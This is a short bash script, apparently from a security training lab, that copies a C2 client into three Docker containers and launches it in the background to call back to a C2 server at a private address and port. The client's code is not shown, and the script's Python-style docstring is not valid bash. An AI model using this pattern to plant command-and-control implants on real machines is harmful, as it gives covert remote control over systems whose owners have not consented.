#!/bin/bash
"""
Malformed Labs C2 Deployment Script
Deploys C2 client to lab containers
"""

echo "=== Malformed Labs C2 Deployment ==="

# C2 Server details
C2_SERVER="192.168.210.13"
C2_PORT="8888"

# Container names
CONTAINERS=("linux_endpoint1" "linux_endpoint2" "linux_endpoint3")

# Copy client to each container and run it
for container in "${CONTAINERS[@]}"; do
    echo "Deploying C2 client to $container..."
    
    # Copy the client file
    docker cp c2client.py "$container:/tmp/"
    
    # Make it executable and run in background
    docker exec -d "$container" sh -c "cd /tmp && python3 c2client.py $C2_SERVER $C2_PORT > /tmp/c2client.log 2>&1 &"
    
    echo "C2 client deployed to $container"
done

echo ""
echo "C2 client deployment complete!"
echo "Clients will connect to: $C2_SERVER:$C2_PORT"
echo ""
echo "To check client logs in a container:"
echo "  docker exec <container_name> cat /tmp/c2client.log"
echo ""
echo "To stop a client in a container:"
echo "  docker exec <container_name> pkill -f c2client.py"